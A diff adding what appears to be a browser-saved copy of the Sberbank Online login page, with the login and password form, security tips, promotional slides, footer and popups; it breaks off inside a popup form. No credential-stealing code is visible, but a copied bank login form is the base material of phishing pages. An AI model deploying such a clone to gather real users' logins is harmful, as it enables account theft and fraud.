@@ -1,0 +1,963 @@
+<!DOCTYPE html>
+<html lang="ru-RU"><head>
+<meta http-equiv="content-type" content="text/html; charset=windows-1251">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="icon" type="image/x-icon" href="https://stat.online.sberbank.ru/CSAFront-res/28.1/skins/sbrf/images/favicon.ico">
+    <title>Сбербанк Онлайн</title>
+    
+    <link rel="stylesheet" href="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/agreement.css">
+    <link rel="stylesheet" href="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/main.css">
+    <link rel="stylesheet" href="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/adaptive.css">
+    <style type="text/css">
+
+        .login-type-switcher {
+            margin-bottom: 0.55em;
+        }
+
+        .src-styles-modal-tab--3nZ34 {
+            margin: -1px -3px -1px -3px;
+            color: #4c6470;
+            background-color: #fff;
+            border: solid 1px #94a2a9;
+            box-shadow: 0 1px 1px 0 rgba(0, 0, 0, 0.08);
+            transition: background-color .3s ease, box-shadow .3s ease, border-color .3s ease, color .3s ease;
+            font-size: 13px;
+            padding: 5px 17px;
+            height: 26px;
+            display: inline-block;
+            vertical-align: middle;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            box-sizing: border-box;
+            white-space: nowrap;
+            overflow: hidden;
+            max-width: 100%;
+            font-weight: 100;
+        }
+
+        .src-styles-modal-tabs--2I23q > input:checked ~ .src-styles-modal-tab--3nZ34 {
+            background-color: #808e95;
+            border-color: #808e95;
+            color: #fff;
+            box-shadow: inset 0 1px 2px 0 rgba(0, 0, 0, 0.25);
+            transition: background-color .3s ease, box-shadow .3s ease;
+        }
+
+        .src-styles-modal-chek--3HrJE {
+            display: none;
+        }
+
+        .src-styles-modal-tabswrap--mxrsy {
+            white-space: nowrap;
+            border-radius: 3px;
+            overflow: hidden;
+            border: solid 1px #94a2a9;
+            text-align: center;
+            width: 98.7%;
+        }
+    </style>
+    <!--[if lt IE 9]>
+        <link rel="stylesheet" href="https://stat.online.sberbank.ru/CSAFront-res/28.1/skins/sbrf/csa/loginPage/stale-browser.css"/>
+        <link rel="stylesheet" href="https://stat.online.sberbank.ru/CSAFront-res/28.1/skins/sbrf/csa/loginPage/ie.css"/>
+        <style type="text/css">
+            .b-bg .bg_slide {
+            	-ms-behavior: url(https://stat.online.sberbank.ru/CSAFront-res/28.1/scripts/csa/loginPage/libs/backgroundsize.min.htc);
+            	behavior: url(https://stat.online.sberbank.ru/CSAFront-res/28.1/scripts/csa/loginPage/libs/backgroundsize.min.htc);
+            }
+        </style>
+    <![endif]-->
+
+
+
+    <link rel="shortcut icon" href="https://online.sberbank.ru/CSAFront/favicon.ico">
+    
+
+
+
+
+    <script async="" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/tag.js"></script><script type="text/javascript" async="" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/watch.js"></script><script type="text/javascript" async="" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/analytics.js"></script><script type="text/javascript" async="" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/watch.js"></script><script type="text/javascript" async="" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/ga.js"></script><script async="" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/gtm.js"></script><script type="text/javascript">(function(u){ s=document.createElement('script'); s.src=u; s.async=true; s.type="text/javascript"; var p = document.head || document.getElementsByTagName('script')[0].parentNode; p.appendChild(s); })("https://stat.online.sberbank.ru/PhizIC-res/group-ib/sbol-5478191701.js");</script><script src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/sbol-5478191701.js" async="" type="text/javascript"></script>
+
+
+
+    <script type="text/javascript">
+        function displayErrorsWithCode(errors) {
+            var params = errors.split("|");
+            var views = {
+                '500' : function() {show.redBalloon(params[1]);},
+                '509' : function() {show.redBalloonProfileBlocked(params[1], params[2], params[3], params[4]);},
+                '510' : function() {show.redBalloon(params[1]);},
+                '548' : function() {show.redBalloonLastAttempt(params[1], params[2]);},
+                '560' : function() {show.redBalloonPhoneError();},
+                '561' : function() {show.redBalloonPhoneLastError(params[1], params[2]);}
+            };
+            var view = views[params[0]];
+            if (view != undefined) {
+                view.call();
+                return true;
+            }
+            return false;
+        }
+    </script>
+
+    <script type="text/javascript">
+        document.webRoot='/CSAFront';
+        var skinUrl = 'https://stat.online.sberbank.ru/CSAFront-res/28.1';
+        var globalUrl = 'https://stat.online.sberbank.ru/CSAFront-res/28.1/skins';
+
+        //скриптовое изменение страницы хелпа (когда формы меняются скриптом)
+        function setCurrentHelpId(id)
+        {
+            additionalHelpId = id;
+        }
+
+        // убирает console errors в IE6
+        (function() {
+            var method;
+            var noop = function () {};
+            var methods = [
+                'assert', 'clear', 'count', 'debug', 'dir', 'dirxml', 'error',
+                'exception', 'group', 'groupCollapsed', 'groupEnd', 'info', 'log',
+                'markTimeline', 'profile', 'profileEnd', 'table', 'time', 'timeEnd',
+                'timeStamp', 'trace', 'warn'
+            ];
+            var length = methods.length;
+            var console = (window.console = window.console || {});
+
+            while (length--) {
+                method = methods[length];
+
+                // Only stub undefined methods.
+                if (!console[method]) {
+                    console[method] = noop;
+                }
+            }
+        }());
+    </script>
+
+    <script src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/jquery-1.js"></script>
+
+    <!--[if IE 6 ]>
+    <script type="text/javascript">
+        $('html').addClass('ie ie6');
+    </script>
+    <![endif]-->
+    <!--[if IE 7 ]>
+    <script type="text/javascript">
+        $('html').addClass('ie ie7 ie78');
+    </script>
+    <![endif]-->
+    <!--[if IE 8 ]>
+    <script type="text/javascript">
+        $('html').addClass('ie ie8 ie78');
+    </script>
+    <![endif]-->
+    <!--[if IE 9 ]>
+    <script type="text/javascript">
+        $('html').addClass('ie ie9');
+    </script>
+    <![endif]-->
+
+    <script src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/respond.js"></script>
+
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/Utils.js"></script>
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/jquery.js"></script>
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/windows.js"></script>
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/DivFloat.js"></script>
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/csaUtils.js"></script>
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/csa.js"></script>
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/customPlaceholder.js"></script>
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/serializeToWin.js"></script>
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/json2.js"></script>
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/inputmask.js"></script>
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/jquery_002.js"></script>
+
+    <!--[if IE 6]>
+        <script type="text/javascript" src="https://stat.online.sberbank.ru/CSAFront-res/28.1/scripts/iepngfix_tilebg.js"></script>
+    <![endif]-->
+
+
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/hashtable.js"></script>
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/rsa.js"></script>
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/rsa-support.js"></script>
+    <script type="text/javascript" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/AC_OETags.js"></script>
+    <script src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/common.js"></script>
+    <script src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/respond.js"></script>
+    <script src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/unable-enter-popup.js"></script>
+    <script src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/eye.js"></script>
+    <script src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/use-balloon.js"></script>
+    
+    
+    
+    
+
+    <script type="text/javascript">
+        $(document).ready(function() {
+            jQuery.extend(jQuery.expr[':'], {
+                focus: "a == document.activeElement"
+            });
+            show.tabs();
+            show.registrationLink = '/CSAFront/async/page/registration.do';
+            show.restoreLoginLink = '/CSAFront/async/restore/login.do';
+            show.recoverPasswordLink = '/CSAFront/async/page/recover.do';
+            show.restoreType = 'both';
+            $('#unable').click(function(event) {
+                show.unableEnterPopup(event);
+            });
+            eye.makeBlinks();
+            show.balloons();
+            formInput.removeRedBorder();
+            
+            
+            
+
+            
+            
+        });
+
+        function phoneIsComplete() {
+            
+            return false;
+        }
+    </script>
+</head>
+<body class="noJS"><img style="display: none;" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/t.gif" alt="" width="1" height="1">
+<input class="eye-bool" value="true" in="in" type="hidden">
+
+
+<!-- Google Tag Manager -->
+<noscript>
+    <iframe src="//www.googletagmanager.com/ns.html?id=GTM-NRDX7Z"
+            height="0" width="0" style="display:none;visibility:hidden"></iframe>
+</noscript>
+<script>
+    (function (w, d, s, l, i)
+    {
+        w[l] = w[l] || [];
+        w[l].push({'gtm.start': new Date().getTime(), event: 'gtm.js'});
+        var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
+        j.async = true;
+        j.src =
+                '//www.googletagmanager.com/gtm.js?id=' + i + dl;
+        f.parentNode.insertBefore(j, f);
+    })(window, document, 'script', 'dataLayer', 'GTM-NRDX7Z');
+</script>
+<!-- End Google Tag Manager -->
+
+<script type="text/javascript">
+    BrowserDetect.init();
+</script>
+
+
+<div class="g-wrapper" id="workspaceCSA">
+    <div id="loading" style="left:-3300px; display: none">
+        <div id="loadingImg"><img src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/ajax-loader64.gif" alt="загрузка"></div>
+        <span>Пожалуйста, подождите,<br> Ваш запрос обрабатывается.</span>
+    </div>
+
+    <div class="g-main">
+        <div class="g-side">
+
+            <div class="b-side-box">
+                <div class="b-auth" id="sendForm">
+                    
+                        <span class="b-ie">
+                            <i class="bl"></i><i class="br"></i><i class="tl"></i><i class="tr"></i><i class="l"></i><i class="r"></i><i class="t"></i><i class="b"></i>
+                        </span><!-- // b-ie -->
+                    
+
+                    
+                        <div class="auth_body" style="height: 295px;">
+                            <div class="b-logo">
+                                <div class="logo_img"></div>
+                            </div><!-- // g-logo -->
+
+                            <form class="b-form auth_form" action="/CSAFront/login.do" onkeypress="validateAndSubmitIfEnter(event)" autocomplete="off" id="loginForm">
+
+                                <!--фэйковые поля логина и пароля. нужны чтоб особо умный google chrome не запоминал пароль -->
+                                <input style="display:none" name="fakeLogin" type="text">
+                                <input style="display:none" name="fakePassword" type="password">
+                                <br>
+
+                                
+
+                                <div class="b-field" onclick="return{type: 'login', valid:{custom: phoneIsComplete, required: true}}">
+                                    <div class="login-div field_inner">
+                                            <input class="field_input" name="field(login)" id="login" maxlength="30" type="text">
+                                            <label class="login_field_title field_title" for="login">Логин</label>
+                                    <div class="field_error login">Введите логин</div></div>
+                                </div>
+                                <!-- // b-field -->
+                                <div class="b-field" onclick="return{type: 'password', valid:{required: true}}">
+                                    <div class="password-div field_inner mask-closed">
+                                            <input class="field_input" id="password" maxlength="130" style="cursor: pointer;" type="password">
+                                        <label class="field_title" for="password">Пароль </label>
+                                    </div>
+                                </div>
+                                <input id="hiddenPasswordField" style="display:none" name="field(password)" type="password">
+                                <!-- ID промоутера -->
+                                
+                                <!-- // b-field -->
+
+                                <div class="form_submit" id="buttonSubmit">
+
+                                    <div class="b-btn btn-small btn-yellow" style="min-width: 100%;padding: 0.55em 0 0.5em;" onclick="validateAndSubmit()">
+                                        <div class="btn_text">Войти</div>
+                                        <i class="btn_curve"></i>
+                                        <button type="button" class="btn_hidden"></button>
+                                    </div>
+                                    <!-- // b-btn -->
+                                    
+                                        <div class="csa_form_remind form_remind tab-safari">
+                                            <a class="aBlack" id="unable" href="https://online.sberbank.ru/CSAFront/page/login-error.do">Забыли<br>логин или пароль?</a>
+                                        </div>
+                                    
+                                </div>
+                            </form>
+                            <!-- // b-form -->
+                        </div>
+                        <div style="display: none" class="b-popup" id="LoginDisabled">
+                            <div class="popup_inner">
+                                <h2 class="popup_title c-red">Введенный Вами логин заблокирован</h2>
+
+                                <div class="popup_content">
+                                    <p>Логин заблокирован до&nbsp;21:00. Попробуйте войти позже или введите другой логин.</p>
+                                </div>
+                            </div>
+                            <a class="popup_close" title="Закрыть"></a>
+                        </div>
+                    
+                </div>
+                <!-- // b-auth -->
+
+                
+                    <div class="b-reg">
+                        <i class="reg_bg">
+
+                        <span class="b-ie">
+                            <i class="bl"></i><i class="br"></i><i class="tl"></i><i class="tr"></i><i class="l"></i><i class="r"></i><i class="t"></i><i class="b"></i>
+                        </span><!-- // b-ie -->
+
+                        </i>
+
+                        <a class="reg_link" href="https://online.sberbank.ru/CSAFront/async/page/registration.do">
+                        <span class="_link tab-safari">Регистрация</span>
+                        <div class="reg_descr">Нужна карта Сбербанка и&nbsp;мобильный телефон</div>
+                        </a>
+                    </div><!-- // b-reg -->
+                
+
+            </div><!-- // b-side-box -->
+
+            <div id="blocking-message-restriction-block">
+                
+            </div>
+
+            
+                <div class="b-secure" id="Secure">
+                    <ul class="secure_blocks">
+                        
+                        
+                        
+                            <li class="secure_block" style="display: list-item;">
+                                <img class="shield" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/shield.png">
+                                <h3 class="secure_title tab-safari">
+                                    <a href="http://www.sberbank.ru/ru/person/dist_services/warning/" target="_blank">Правила безопасности</a>
+                                </h3>
+
+                                <div class="secure_text">
+                                    Если вас просят ввести пароль входа 
+в&nbsp;Сбербанк&nbsp;Онлайн для&nbsp;отмены или аннулирования  операции,
+ не&nbsp;делайте этого. Это мошенники
+                                </div>
+                            </li>
+                        
+                            <li class="secure_block" style="display: none;">
+                                <img class="shield" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/shield.png">
+                                <h3 class="secure_title tab-safari">
+                                    <a href="http://www.sberbank.ru/ru/person/dist_services/warning/" target="_blank">Правила безопасности</a>
+                                </h3>
+
+                                <div class="secure_text">
+                                    Сбербанк никогда не&nbsp;присылает SMS с&nbsp;просьбой сообщить логин или пароль
+                                </div>
+                            </li>
+                        
+                            <li class="secure_block" style="display: none;">
+                                <img class="shield" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/shield.png">
+                                <h3 class="secure_title tab-safari">
+                                    <a href="http://www.sberbank.ru/ru/person/dist_services/warning/" target="_blank">Правила безопасности</a>
+                                </h3>
+
+                                <div class="secure_text">
+                                    Никому не&nbsp;говорите свой логин 
+и&nbsp;пароль, даже если вам представились сотрудником Сбербанка
+                                </div>
+                            </li>
+                        
+                            <li class="secure_block" style="display: none;">
+                                <img class="shield" src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/shield.png">
+                                <h3 class="secure_title tab-safari">
+                                    <a href="http://www.sberbank.ru/ru/person/dist_services/warning/" target="_blank">Правила безопасности</a>
+                                </h3>
+
+                                <div class="secure_text">
+                                    Сбербанк Онлайн никогда 
+не&nbsp;запрашивает номер паспорта при подтверждении операций и входе на
+ сайт
+                                </div>
+                            </li>
+                        
+                    </ul>
+                    <a class="secure_next _dot" tabindex="0">Еще совет</a>
+                </div>
+                <!-- // b-secure -->
+            
+
+        </div><!-- // g-side -->
+    <div class="g-content">
+        
+        <div class="g-content-reducer">
+            <div class="g-content-inner">
+
+                
+
+                <div class="b-slides" id="Slides">
+                    <div class="slides_slide css3transition" style="visibility: visible; display: block; opacity: 1;">
+                        
+                        
+                        
+                        <h1 class="slides_title"><a href="#">Кредит там, где удобно вам!</a></h1>
+                        <div class="slides_descr">Наши клиенты, получающие зарплату или пенсию на карту Сбербанка, могут получить кредит не выходя из дома</div>
+                    </div>
+                    <div class="slides_slide css3transition">
+                        
+                        
+                        
+                        <h1 class="slides_title"><a href="#">Подключите Автоплатёж ЖКХ</a></h1>
+                        <div class="slides_descr">Услуга Автоплатёж поможет не тратить время на оплату счетов за ЖКХ</div>
+                    </div>
+                    <div class="slides_slide css3transition">
+                        
+                        
+                        
+                        <h1 class="slides_title"><a href="#">Вот это номер!</a></h1>
+                        <div class="slides_descr">Для перевода денег клиенту Сбербанка достаточно знать номер его телефона</div>
+                    </div>
+                </div>
+                <!-- b-slides -->
+
+                <div class="b-news">
+                    <div class="news_inner">
+                        <div class="news_fade"></div>
+                        <div class="news_blur" style="left: -426.567px; top: -553.633px;"></div>
+                        <span class="b-ie">
+                            <i class="bl"></i><i class="br"></i><i class="l"></i><i class="r"></i>
+                            <i class="tl"></i><i class="tr"></i><i class="t"></i><i class="b"></i>
+                        </span><!-- // b-ie -->
+
+
+                        <div class="news_content">
+                            <h3 class="news_title"><a class="aBlack" href="https://online.sberbank.ru/CSAFront/news/list.do">События</a></h3>
+                            <ul class="news_list" id="MainPageNews"><li class="news_item "><div class="news_cap"><a href="https://online.sberbank.ru/CSAFront/news/view.do?id=870" class="aBlack"><span>Аудитория приложения Сбербанк Онлайн превысила 30 млн</span></a></div><small class="news_date">26.02</small></li><li class="news_item "><div class="news_cap"><a href="https://online.sberbank.ru/CSAFront/news/view.do?id=868" class="aBlack"><span>В приложении Сбербанк Онлайн появились «Диалоги»</span></a></div><small class="news_date">12.02</small></li></ul>
+                        </div>
+                    </div>
+                </div>
+                <!-- // b-news -->
+
+            </div>
+            <!-- // g-content-inner -->
+        </div>
+        <!-- // g-content-reducer -->
+    </div>
+    <!-- // g-content -->
+    
+        <div id="pmfso-set-div"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="1" height="1">
+<param name="movie" value="https://stat.online.sberbank.ru/CSAFront-res/28.1/images/swf/pmfso.swf?nocache=1523303201918">
+<param name="quality" value="high">
+<param name="bgcolor" value="#FFFFFF">
+<param name="allowScriptAccess" value="sameDomain">
+<param name="FlashVars" value="pmdata=&amp;browserType=Firefox">
+<embed src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/pmfso.swf" flashvars="pmdata=&amp;browserType=Firefox" allowscriptaccess="sameDomain" quality="low" bgcolor="#FFFFFF" type="application/x-shockwave-flash" width="1" height="1">
+<noembed></noembed>
+<noobject></noobject>
+
+<noobject></noobject>
+</object>
+</div>
+        <div id="pmfso-send-div"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="1" height="1">
+<param name="movie" value="https://stat.online.sberbank.ru/CSAFront-res/28.1/images/swf/pmfso.swf?nocache=1523303201920">
+<param name="quality" value="high">
+<param name="bgcolor" value="#FFFFFF">
+<param name="allowScriptAccess" value="sameDomain">
+<param name="FlashVars" value="gotoUrl=&amp;sendUrl=https://online.sberbank.ru/CSAFront/pmfso&amp;browserType=Firefox">
+<embed src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/pmfso_002.swf" flashvars="gotoUrl=&amp;sendUrl=https://online.sberbank.ru/CSAFront/pmfso&amp;browserType=Firefox" allowscriptaccess="sameDomain" quality="high" bgcolor="#FFFFFF" type="application/x-shockwave-flash" width="1" height="1">
+<noembed>
+&lt;script&gt;
+&lt;/script&gt;
+ </noembed>
+<noobject></noobject>
+
+<noobject></noobject>
+</object>
+</div>
+    
+
+    <div class="g-footer">
+        <div class="g-footer-inner">
+
+            <div class="b-about">
+                <table style="width:100%;">
+                    <tbody><tr><td style="width:10%;vertical-align: sub">
+                        <div class="b-phones" style="overflow: hidden;">
+                            <h3 class="phones_title">Круглосуточный контактный центр</h3>
+                            <div class="phones-box">
+                                <div class="phones-row">
+                                    <div class="mobile">
+                                        <div class="phones_phone"><a href="tel:900">900</a></div>
+                                        <div class="b-data data_descr">с&nbsp;мобильного</div>
+                                    </div>
+                                    <div class="regular">
+                                        <div class="phones_phone" style="overflow: hidden;"><a href="tel:+74955005550"><span>+</span>7&nbsp;495 <b>500-555-0</b></a></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- // b-phones -->
+                    </td>
+                        <td style="width:10%">
+                            &nbsp;&nbsp;
+                        </td>
+                        <td style="width:100%">
+                            <div class="b-data">
+                                
+                                <div class="data_copy">©&nbsp;1997–2018&nbsp;<a target="_blank" href="http://sberbank.ru/">ПАО Сбербанк</a></div>
+                                <div class="data_descr" style="vertical-align: top;">
+                                    Россия, Москва, 117997, ул. Вавилова&nbsp;19. Генеральная лицензия
+                                    на&nbsp;осуществление банковских операций от&nbsp;11&nbsp;августа 2015 года.
+                                    Регистрационный номер&nbsp;— 1481.
+                                </div>
+                            </div>
+                        </td>
+                        <!-- // b-data -->
+                    </tr>
+                    </tbody></table>
+            </div>
+            <!-- // b-about -->
+
+            
+                <div class="b-social">
+                    <a class="social_item fb" href="https://www.facebook.com/bankdruzey" target="_blank"></a>
+                    <a class="social_item vk" href="http://vk.com/bankdruzey" target="_blank"></a>
+                    <a class="social_item ok" href="https://ok.ru/sberbank" target="_blank"></a>
+                    <a class="social_item tw" href="https://twitter.com/sberbank/" target="_blank"></a>
+                    <a class="social_item yt" href="http://www.youtube.com/sberbank" target="_blank"></a>
+                </div>
+            
+            <!-- // b-social -->
+            
+                
+                
+                
+                    
+                                <a class="b-apps" href="http://www.sberbank.ru/moscow/ru/person/dist_services/inner_apps/" target="_blank">
+                                    <span class="apps_text">Мобильные приложения</span>
+                                </a><!-- // b-apps -->
+                            
+                
+            
+            
+
+            
+        </div>
+        <!-- // g-footer-inner -->
+    </div>
+    <!-- // g-footer -->
+
+    </div>
+    <!-- // g-main -->
+
+    <div class="b-bg" id="Backgrounds">
+        <div class="bg_list">
+            <div class="bg_slide css3transition" style="background-image: url(&quot;https://stat.online.sberbank.ru/CSAFront-res/28.1/skins/sbrf/images/csa/loginPage/slide0.jpg&quot;); visibility: visible; display: block; opacity: 1;"></div>
+            <div class="bg_slide css3transition" style="background-image:url(https://stat.online.sberbank.ru/CSAFront-res/28.1/skins/sbrf/images/csa/loginPage/slide1.jpg)"></div>
+            <div class="bg_slide css3transition" style="background-image:url(https://stat.online.sberbank.ru/CSAFront-res/28.1/skins/sbrf/images/csa/loginPage/slide2.jpg)"></div>
+        </div>
+        <div class="bg_paging"><a class="bg_page current"></a><a class="bg_page"></a><a class="bg_page"></a></div>
+    </div>
+    <!-- // b-bg -->
+
+    <div class="g-overlay">
+
+        <div class="b-popup" id="AccessDenied">
+            <div class="popup_inner">
+                <h2 class="popup_title c-red">Во&nbsp;входе отказано</h2>
+
+                <div class="popup_content">
+                    <p>Вы&nbsp;неправильно указали логин, идентификатор или пароль. Осталось две попытки ввода, после чего
+                        логин будет заблокирован на&nbsp;один час.</p>
+                </div>
+            </div>
+            <a class="popup_close" title="Закрыть"></a>
+        </div>
+        <!-- // b-popup -->
+
+        <div class="b-popup" id="unable-enter">
+            <div class="popup_inner">
+                <div class="popup_content"></div>
+            </div>
+            <a class="popup_close" title="Закрыть"></a>
+        </div>
+        <!-- // b-popup -->
+
+        <div class="b-popup" id="MultiRegFix">
+            <div class="popup_inner">
+                <h2 class="popup_title">Выбор идентификатора, логина</h2>
+
+                <div class="popup_content">
+                    <p>Вы&nbsp;повторно зарегистрировались в&nbsp;Сбербанк Онлайн. Выберите один идентификатор (логин),
+                        который будет в&nbsp;дальнейшем использоваться при работе с&nbsp;системой. Второй идентификатор
+                        будет удален.</p>
+
+                    <form class="b-form form_popup" action="#">
+                        <fieldset class="form_fields">
+                            <label class="form_label">
+                                <input class="form_cbx" name="login" type="radio"> Bankosberovskiy1943
+                            </label>
+                            <label class="form_label">
+                                <input class="form_cbx" name="login" type="radio"> Sberobankovsky123
+                            </label>
+                        </fieldset>
+                        <div class="form_submit">
+                            <div class="b-btn btn-small btn-yellow">
+                                <div class="btn_text">Продолжить с&nbsp;выбранным</div>
+                                <i class="btn_curve"></i>
+                                <button type="submit" class="btn_hidden"></button>
+                            </div>
+                            <!-- // b-btn -->
+
+                        </div>
+                    </form>
+                </div>
+            </div>
+            <a class="popup_close" title="Закрыть"></a>
+        </div>
+
+        <div class="b-popup popup_oidc" id="Agreement">
+            <div class="popup_inner">
+                <h2 class="popup_title">Согласие</h2>
+                <p>Текст согласия</p>
+
+                <div class="popup_content">
+                    <form class="b-form form_popup" action="#">
+                        <fieldset class="form_fields">
+                            <label class="form_label">
+                                <input class="form_cbx" name="login" type="checkbox"> Принимаю условия
+                            </label>
+                        </fieldset>
+                        <div class="form_submit">
+                            <div class="b-btn btn-small btn-yellow">
+                                <div class="btn_text">Отмена</div>
+                                <i class="btn_curve"></i>
+                                <button type="submit" class="btn_hidden" disabled="disabled"></button>
+                            </div>
+                            <!-- // b-btn -->
+                        </div>
+                        <div class="form_submit">
+                            <div class="b-btn btn-small btn-yellow">
+                                <div class="btn_text">Продолжить с&nbsp;выбранным</div>
+                                <i class="btn_curve"></i>
